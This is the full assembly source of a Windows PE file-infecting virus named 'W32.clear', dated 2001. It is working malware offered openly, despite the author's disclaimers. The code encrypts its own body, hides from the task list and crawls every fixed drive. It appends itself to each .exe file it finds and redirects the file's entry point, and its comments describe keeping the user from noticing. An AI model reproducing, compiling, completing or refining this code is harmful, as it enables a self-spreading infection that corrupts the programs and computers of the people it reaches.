; [ W32.clear by drcmda ]
; -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
;  SIMPLE BUT CLEAR WIN32 PE INFECTOR, USES SIMPLE  XOR  ENCRYPTION,
;  MUTEXES AND  DIRECTORY TRAVERSEL  (ON EVERY FIXED DRIVE)... I FOR 
;  MYSELF  DON'T  LIKE VIRII  BUT SINCE I DISCOVERED THE PE-HEADER I
;  JUST WANTED TO WRITE ONE :) I  TRIED TO  UNDERSTAND  100% OF  THE 
;  TECHNIQUES USED FOR THIS PURPOSE SO I WROTE EVERY ROUTINE IN THIS
;  VIRUS  ON MY OWN. I ALSO TRIED TO OPTIMIZE COMMON STRUCTURES LIKE
;  INFECTING, API-BASE SEARCHING,  DIR-SCANNING,  ...  I WOULD NEVER
;  SPREAD A  VIRUS, I WROTE THIS  JUST TO GET A BETTER GRIP WITH THE
;  PE HEADER ;) HEHE BYE...      - DRCMDA [ DRCMDA@GMX.DE ] (C) 2001
;  -----------------------------------------------------------------
;  P L E A S E  D O  N O T  C O M P I L E  (A N D  R U N !)  T H I S
; -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-

.486
.MODEL                  FLAT, STDCALL
OPTION                  CASEMAP: NONE

INCLUDE                 \MASM32\INCLUDE\KERNEL32.INC
INCLUDELIB              \MASM32\LIB\KERNEL32.LIB

VIRUS_SIZE              EQU VIRUS_END - VIRUS_START

MAX_PATH                EQU 104H
OF_READ                 EQU 000H
GHND                    EQU 002H OR 040H
FILE_ATTRIBUTE_NORMAL   EQU 080H
FILE_ATTRIBUTE_DIR      EQU 010H
DRIVE_FIXED             EQU 003H

.CODE
FIRST_GEN:
        PUSH            0
        CALL            ExitProcess

VIRUS_START:
        PUSHAD
        CALL            DELTA
DELTA:  POP             EBP
        SUB             EBP, DELTA                       ; EBP = DELTA OFFSET

XOR_KEY:MOV             DH,0                             ; WILL BE PATCHED LATER...
        LEA             ESI, [ EBP + E_START ]           ; SO NO XOR EDX, EDX :)
        PUSH            ESI
        MOV             ECX, VIRUS_END - E_START

;________________ _ _ _ [      -ENCRYPT-       ] _ _ _ __ 
ENCRYPT:XOR             BYTE PTR [ ESI ], DH             ; EN/DE-CRYPTS THE VIRUS_BDY
        ROL             DH, 1                            ; VERY LAME I KNOW...
        INC             ESI
        DEC             ECX
        JNZ             ENCRYPT
        RET

E_START:CALL            GET_KERNEL                       ; GET KERNEL BASE

        MOV             ECX, 27
        LEA             ESI, [ EBP + ___KERNEL32 ]
        CALL            GET_APIS                         ; GET KERNEL API'S

        CALL            _M01
        DB              "blablabla",0
_M01:   PUSH            1
        PUSH            0
        CALL            [ _CREATEMUTEX ]           
        CALL            [ _GETLASTERROR ]          
        TEST            EAX, EAX                   
        JNZ             MUTEX_EXIST

        PUSH            1                
        PUSH            0
        CALL            [ EBP + _RSP ]                   ; TRY TO HIDE FROM TASK-LIST
        
        CALL            [ EBP + _GETCOMMANDLINE ]        ; START REAL HOST WITH WINEXIT
        PUSH            1                                ; NOW THE USER WON'T NOTIZE
        PUSH            EAX                              ; ANY LOADING-TIME INCREASE
        CALL            [ EBP + _WINEXEC ]

        CALL            INFECT_EVERYTHING                ; THE NAME SAYS ALL :)

        PUSH            0                                
        PUSH            0                            
        CALL            [ EBP + _BEEP ]              
        
        PUSH            0
        CALL            [ EBP + _EXITPROCESS ]           ; WE'RE DONE, THE ENTIRE FUCKING 
                                                         ; COMPUTER SHOULD BE INFECTED :)
MUTEX_EXIST:

ERR_EXT:POPAD
HRETURN:PUSH            DWORD PTR OFFSET FIRST_GEN       ; RETURN TO HOST
        RET                                              ; WILL BE PATCHED LATER

;________________ _ _ _ [     -GET_KERNEL-     ] _ _ _ __
GET_KERNEL:                                              ; RETURNS THE KERNEL BASE
        MOV             ECX, [ ESP + 9 * 4 ]             ; SIMPLE BUT SMALL :)      
@@:     DEC             ECX
        MOVZX           EDX, WORD PTR [ ECX + 03CH ]     ; EDX = POINTER TO PE_HDR
        CMP             ECX, [ ECX + EDX + 034H ]        ; COMPARE CURRENT BASE WITH
        JNZ             @B                               ; THE KERNEL IMAGE_BASE (MZ)
        MOV             [ EBP + _KERNEL ], ECX           ; STORE RESULT
        MOV             [ EBP + _DEFAULT ], ECX
        RET

;________________ _ _ _ [      -GET_APIS-      ] _ _ _ __
GET_APIS:                                                ; SCANS THROUGH API TABLE
        INC             ESI                              ; AND RETURNS ADDRESSES
        PUSH            ECX
        CALL            GET_API                          ; SEARCH SINGLE API ADDRESS
        POP             ECX
        MOVZX           EBX, BYTE PTR [ ESI - 1 ]
        ADD             ESI, EBX                         ; STORE ADDRESS IN THE
        MOV             [ ESI ], EAX                     ; API TABLE...
        ADD             ESI, 4
        LOOP            GET_APIS                         ; NEXT ONE
        RET

;________________ _ _ _ [      -GET_API-       ] _ _ _ __
GET_API:                                                 ; SCANS FOR A SINGLE API ADR
        MOV             EDX, [ EBP + _DEFAULT ]          ; EDX = DEFAULT MODULE BASE
        ADD             EDX, [ EDX + 03CH ]              ;       + OFFSET PE_HEADER
        MOV             EDX, [ EDX + 078H ]              ; EDX = PTR EXPORT_DIR RVA
        ADD             EDX, [ EBP + _DEFAULT ]          ;       + BASE
        MOV             EDI, [ EDX + 020H ]              ; EDI = PTR ADDRESS_OF_NAMES RVA
        ADD             EDI, [ EBP + _DEFAULT ]          ;       + BASE
        MOV             EDI, [ EDI ]                     ; EDI = PTR ADR_OF_NAMES RVA
        ADD             EDI, [ EBP + _DEFAULT ]          ;       + BASE
        MOV             EAX, [ EDX + 018H ]              ; EAX = NUMBER_OF_NAMES
        XOR             EBX, EBX
NXT_ONE:INC             EBX
        MOVZX           ECX, BYTE PTR [ ESI - 1 ]        ; LENGHT OF SPEZIFED API NAME
        PUSH            ESI
        PUSH            EDI
        REPZ            CMPSB                            ; COMPARE API NAME WITH
        POP             EDI                              ; EXPORT ENTRY
        POP             ESI
        JZ              FOUND
        PUSH            EAX
        XOR             AL, AL
        SCASB                                            ; GET NEXT ONE
        JNZ             $ - 1
        POP             EAX
        DEC             EAX                              ; DECREASE NUMBER_OF_NAMES
        JZ              ERR_EXT
        JMP             NXT_ONE
FOUND:  MOV             ECX, [ EDX + 024H ]              ; ECX = PTR NBR_NAME_ORDS RVA
        ADD             ECX, [ EBP + _DEFAULT ]          ;       + BASE
        DEC             EBX
        MOVZX           EAX, WORD PTR [ ECX + EBX * 2 ]  ; EAX = ORDINAL OF FUNCTION
        MOV             EBX, [ EDX + 01CH ]              ; EBX = PTR ADR_OF_FUNCTIONS RVA
        ADD             EBX, [ EBP + _DEFAULT ]          ;       + BASE
        MOV             EAX, [ EBX + EAX * 4 ]           ; EAX = FUNCTION RVA!!!!
        ADD             EAX, [ EBP + _DEFAULT ]          ;       + BASE
        RET

;________________ _ _ _ [ -INFECT_EVERYTHING-  ] _ _ _ __
INFECT_EVERYTHING:                                       ; INFECTS EVERY FIXED DRIVE!!!                
        LEA             EAX, [ EBP + DRIVES ]            ; 
        MOV             [ EBP + OFS ], EAX               ; GET DRIVE STRINGS
        PUSH            EAX
        PUSH            50
        CALL            [ EBP + _GETLOGICALDRIVESTRINGS ]

LOOP_:  PUSH            [ EBP + OFS ]           
        CALL            [ EBP + _GETDRIVETYPE ]          ; IS IT A FIXED DRIVE???
        CMP             EAX, DRIVE_FIXED     
        JNZ             BAHHH

        PUSH            [ EBP + OFS ]
        CALL            [ EBP + _SETCURRENTDIR ]         
        CALL            INFECT_DRIVE                     ; LET'S INFECT IT :)
        
BAHHH:  ADD             [ EBP + OFS ], 4                 ; GET NEXT CANDIDATE
        MOV             EAX, [ EBP + OFS ]
        CMP             BYTE PTR [ EAX ], 0
        JNZ             LOOP_        
        RET        

;________________ _ _ _ [    -INFECT_DRIVE-    ] _ _ _ __
INFECT_DRIVE:                                            ; INFECTS THE WHOLE DRIVE :)                                                            
        LEA             EAX, [ EBP + W32FINDDATA ]       ; 
        PUSH            EAX
        LEA             EAX, [ EBP + FILE_MASK ]
        PUSH            EAX
        CALL            [ EBP + _FINDFIRSTFILE ]         ; START SEARCHING
        
        INC             EAX
        JZ              _S_OUT
        DEC             EAX
        MOV             [ EBP + S_HANDLE ], EAX
        
_S_SCAN:CMP             [ EBP +  F_OATTRIBS ], FILE_ATTRIBUTE_DIR
        JNZ             NODIR
        cmp             BYTE PTR [ EBP + FILENAME ],"."  ; "." AND ".." ARE NOT NEEDED...
        JZ              _NEXT
        
        LEA             EAX, [ EBP + FILENAME ]          ; IF WE FOUND A DIRECTORY WE SET
        PUSH            EAX                              ; SET THE CUR DIR TO THIS PLACE AND
        CALL            [ EBP + _SETCURRENTDIR ]         ; CONTINUE THE SEARCH THERE...
        
        PUSH            [ EBP + S_HANDLE ]               ; SAVE SEARCH HANDLE
        call            INFECT_DRIVE                     ; RECURSIVE         
        POP             [ EBP + S_HANDLE ]               ; GET OLD HANDLE AND CONTINUE

        JMP             _NEXT
     
NODIR:  LEA             EAX, [ EBP + FILENAME ]
        PUSH            EAX
        CALL            [ EBP + _LSTRLEN ]               ; EXCUSE MY LAZYNESS :)
        
        CMP             DWORD PTR [ EBP + FILENAME + EAX - 4 ], "EXE."
        JZ              _1
        CMP             DWORD PTR [ EBP + FILENAME + EAX - 4 ], "exe."
        JNZ             _NEXT
        
_1:     CMP             [ EBP + FILESIZEH ], 0           ; ONLY FILES UNDER 4 GIGS...
        JNZ             _NEXT        
        
        CALL            INFECT_FILE                      ; EXE FOUND SO INFECT IT!
        
_NEXT:  PUSH            100                              ; WAIT 100ms NOW THE USER SHOULDN'T
        CALL            [ EBP + _SLEEP ]                 ; NOTIZE ANY DISK-USAGE... (HOPE SO)
        LEA             EAX, [ EBP + W32FINDDATA ]
        PUSH            EAX
        PUSH            [ EBP + S_HANDLE ]
        CALL            [ EBP + _FINDNEXTFILE ]          ; GRAB SEARCH_HANDLE AND SEARCH
        TEST            EAX, EAX                         ; MORE FILES THAT ARE MATCHING TO
        JNZ             _S_SCAN                          ; OUR PATTERN ("*")...
        
        LEA             EAX, [ EBP + BACK ]
        PUSH            EAX
        CALL            [ EBP + _SETCURRENTDIR ]         ; ".." MEANS GET ONE DIR BACK
        
        PUSH            [ EBP + S_HANDLE ]
        CALL            [ EBP + _FINDCLOSE ]
_S_OUT: RET

;________________ _ _ _ [     -OPEN_FILE-      ] _ _ _ __
INFECT_FILE:                                             ; OPENS A FILE AND ALLOCATE MEM
        PUSH            FILE_ATTRIBUTE_NORMAL            ; I DON'T USE FILEMAPPING COZ
        LEA             EAX, [ EBP + FILENAME ]          ; I SIMPLY HATE IT... IMAGINE
        PUSH            EAX                              ; YOU MAP A FILE AND BEGIN TO
        CALL            [ EBP + _SETFILEATTRIBUTES ]     ; MAKE THE FIRST CHANGES, NOW
                                                         ; YOU REALIZE THE PE IS NOT
        PUSH            OF_READ                          ; VALID OR CORRUPTED (PACKED
        LEA             EAX, [ EBP + FILENAME ]          ; FILES OR SOME MS PE'S
        PUSH            EAX                              ; [OUTLOOK])... THIS PE SHOULD
        CALL            [ EBP + __LOPEN ]                ; BE HISTORY NOW :) I USED IT
        MOV             [ EBP + FILEHANDLE ], EAX        ; BEFORE AND MUST SAY THAT
        MOV             EAX, [ EBP + FILESIZE ]          ; I HAD TONS OF PROBLEMS WITH
        ADD             [ EBP + MAPSIZE ], EAX           ; THIS TECHNIQUE...
        PUSH            [ EBP + MAPSIZE ]
        PUSH            GHND
        CALL            [ EBP + _GLOBALALLOC ]
        MOV             [ EBP + H_BUFFER ], EAX
        PUSH            EAX
        CALL            [ EBP + _GLOBALLOCK ]            ; ALLOCATE MEM FOR THE FILE +
        TEST            EAX, EAX                         ; VIRUS_BODY
        JZ              _EXIT
        MOV             [ EBP + M_BUFFER ], EAX
        PUSH            [ EBP + FILESIZE ]
        PUSH            [ EBP + M_BUFFER ]
        PUSH            [ EBP + FILEHANDLE ]
        CALL            [ EBP + __LREAD ]                ; READ ENTIRE FILE TO BUFFER
        PUSH            [ EBP + FILEHANDLE ]
        CALL            [ EBP + __LCLOSE ]

;________________ _ _ _ [    -INFECT_FILE-     ] _ _ _ __
        MOV             EDI, [ EBP + M_BUFFER ]          ; EDI = POINTER TO MEM BLOCK
        CMP             WORD PTR [ EDI ], "ZM"           ; DO SOME CHECKS (MZ/PE/INFMARK)
        JNZ             _EXIT
        ADD             EDI, [EDI + 03CH]                ; EDI = POINTER TO PE_HDR
        CMP             WORD PTR [ EDI ], "EP"
        JNZ             _EXIT
        CMP             DWORD PTR [ EDI + 04CH ], 0
        JNZ             _EXIT
                                                         ; RETURN LAST SECTION
        MOV             ECX, [ EDI + 074H ]              ; ECX = NUMBER_OF_RVA_AND_SIZES
        LEA             ECX, [ ECX * 8 + EDI ]           ;       x 8 + OFFSET PE_HEADER
        MOVZX           EAX, WORD PTR [ EDI + 006H ]     ; EAX = NUMBER_OF_SECTIONS
        DEC             EAX                              ;       - 1
        LEA             EBX, [ EAX + EAX * 4 ]           ; EBX = EAX x 28H
        LEA             EBX, [ EBX * 8 ]                 ;       ...
        LEA             EBX, [ EBX + ECX + 078H ]        ; EBX = EBX + ECX + 078H

        MOV             EAX, VIRUS_SIZE
        XADD            [ EBX + 008H ], EAX              ; CHANGE VIRTUALSIZE
        CMP             EAX, [ EBX + 010H ]
        JA              _EXIT

        PUSH            EAX
        PUSH            DWORD PTR [ EBX + 010H ]
        ADD             EAX, VIRUS_SIZE
        XOR             EDX, EDX
        MOV             ECX, [ EDI + 03CH ]
        DIV             ECX
        INC             EAX
        IMUL            EAX, ECX
        MOV             [ EBX + 010H ], EAX              ; CHANGE SIZE_OF_RAW_DATA

        POP             ECX
        MOV             EAX, [ EBX + 010H ]
        SUB             EAX, ECX                         ; CHANGE SIZE_OF_IMAGE
        ADD             [ EDI + 050H ], EAX
                                                         ; CHANGE ATTRIBS & INFMARK
        OR              DWORD PTR [ EBX + 024H ], 0C0000000H
        MOV             DWORD PTR [ EDI + 04CH ], "BDHP"

        POP             EAX
        ADD             EAX, [ EBX + 00CH ]
        XCHG            [ EDI + 028H ], EAX              ; CHANGE ENTRY_POINT
        ADD             EAX, [ EDI + 034H ]

        MOV             EDI, [ EBX + 014H ]              ; VIRUS_POS = VIRT_ADR +
        ADD             EDI, [ EBX + 008H ]              ;             VIRT_SIZE
        MOV             ECX, VIRUS_SIZE
        SUB             EDI, ECX
        ADD             EDI, [ EBP + M_BUFFER ]
        LEA             ESI, [ EBP + VIRUS_START ]
        REP             MOVSB                            ; WRITE VIRUS_BODY TO BUFFER

;________________ _ _ _ [     -CLOSE_FILE-     ] _ _ _ __
        ADD             BYTE PTR [ EBP + XOR_KEY + 1 ], 10
        MOV             DH, BYTE PTR [ EBP + XOR_KEY + 1 ]
        MOV             BYTE PTR [ EDI - ( VIRUS_END - XOR_KEY ) + 1 ], DH
        MOV             [ EDI - ( VIRUS_END - HRETURN ) + 1 ], EAX

        LEA             ESI, [ EDI - ( VIRUS_END - E_START ) ]
        MOV             ECX, VIRUS_END - E_START
        CALL            ENCRYPT                          ; ENCRYPT VIRUS_BODY

        PUSH            0                                ; TRUNCATE FILE AND OPEN
        LEA             EAX, [ EBP + FILENAME ]          ; FILE FOR WRITE ACCESS
        PUSH            EAX                              ; (FILE ATTRIBS ARE SET ABOVE)
        CALL            [ EBP + __LCREAT ]
        INC             EAX
        JZ              _EXIT

        MOV             EAX, [ EBX + 014H ]              ; FILESIZE = VIRT_ADR +
        ADD             EAX, [ EBX + 010H ]              ;            SIZE_OF_RAW_DATA

        PUSH            EAX
        PUSH            [ EBP + M_BUFFER ]               ; WRITE BUFFER TO FILE...
        PUSH            [ EBP + FILEHANDLE ]             ; CLOSE FILE...
        CALL            [ EBP + __LWRITE ]               ; GET RID OF THOSE MEMORY
        PUSH            [ EBP + FILEHANDLE ]             ; POINTERS AND FREE MEMORY... 
        CALL            [ EBP + __LCLOSE ]               ; SET OLD FILE ATTRIBUTES
_EXIT:  PUSH            [ EBP + M_BUFFER ]
        CALL            [ EBP + _GLOBALUNLOCK ]
        PUSH            [ EBP + H_BUFFER ]
        CALL            [ EBP + _GLOBALFREE ]

        PUSH            [ EBP + F_OATTRIBS ]
        LEA             EAX, [ EBP + FILENAME ]
        PUSH            EAX
        CALL            [ EBP + _SETFILEATTRIBUTES ]
        RET

;________________ _ _ _ [     -VIRUS_DATA-     ] _ _ _ __ 
___KERNEL32:                                             ;
                        DB 06,"_lopen"                   ; API TABLE
__LOPEN                 DD 0                             ; WILL BE FILLED UP WITH ADR'S
                        DB 06,"_lread"                   ; FROM A SPEZIFED MODULE-EXPORT
__LREAD                 DD 0                             ; TABLE (IN THIS CASE KERNEL32)
                        DB 07,"_lwrite" 
__LWRITE                DD 0
                        DB 07,"_lclose"
__LCLOSE                DD 0
                        DB 07,"_lcreat"
__LCREAT                DD 0
                        DB 11,"GlobalAlloc"
_GLOBALALLOC            DD 0
                        DB 10,"GlobalLock"
_GLOBALLOCK             DD 0
                        DB 12,"GlobalUnlock"
_GLOBALUNLOCK           DD 0            
                        DB 10,"GlobalFree"
_GLOBALFREE             DD 0
                        DB 13,"FindFirstFile"
_FINDFIRSTFILE          DD 0
                        DB 12,"FindNextFile"
_FINDNEXTFILE           DD 0
                        DB 09,"FindClose"
_FINDCLOSE              DD 0
                        DB 17,"SetFileAttributes"
_SETFILEATTRIBUTES      DD 0
                        DB 17,"GetFileAttributes"
_GETFILEATTRIBUTES      DD 0
                        DB 19,"SetCurrentDirectory"
_SETCURRENTDIR          DD 0
                        DB 22,"GetLogicalDriveStrings"
_GETLOGICALDRIVESTRINGS DD 0
                        DB 12,"GetDriveType"
_GETDRIVETYPE           DD 0
                        DB 07,"lstrlen"
_LSTRLEN                DD 0                                                  
                        DB 04,"Beep"
_BEEP                   DD 0
                        DB 11,"CreateMutex"
_CREATEMUTEX            DD 0
                        DB 12,"ReleaseMutex"
_RELEASEMUTEX           DD 0
                        DB 12,"GetLastError"
_GETLASTERROR           DD 0
                        DB 11,"ExitProcess"
_EXITPROCESS            DD 0
                        DB 22,"RegisterServiceProcess"
_RSP                    DD 0
                        DB 14,"GetCommandLine"
_GETCOMMANDLINE         DD 0
                        DB 07,"WinExec"
_WINEXEC                DD 0
                        DB 05,"Sleep"
_SLEEP                  DD 0
                                                  
_KERNEL                 DD 0                             ; BASE PLACEHOLDERS
_DEFAULT                DD 0

MAPSIZE                 DD VIRUS_SIZE + 1000H

FILEHANDLE              DD 0
H_BUFFER                DD 0
M_BUFFER                DD 0

W32FINDDATA:                                             ; WIN32_FIND_DATA STRUC
F_OATTRIBS              DD 0
                        DD 6 DUP ( 0 )
FILESIZEH               DD 0
FILESIZE                DD 0
                        DD 2 DUP ( 0 )
FILENAME                DB MAX_PATH DUP ( 0 )
                        DB 14 DUP ( 0 )
 
FILE_MASK               DB "*", 0        
DRIVES                  DB 50 dup ( 0 )
BACK                    DB "..", 0        
S_HANDLE                DD 0
OFS                     DD 0        

VIRUS_END:

END VIRUS_START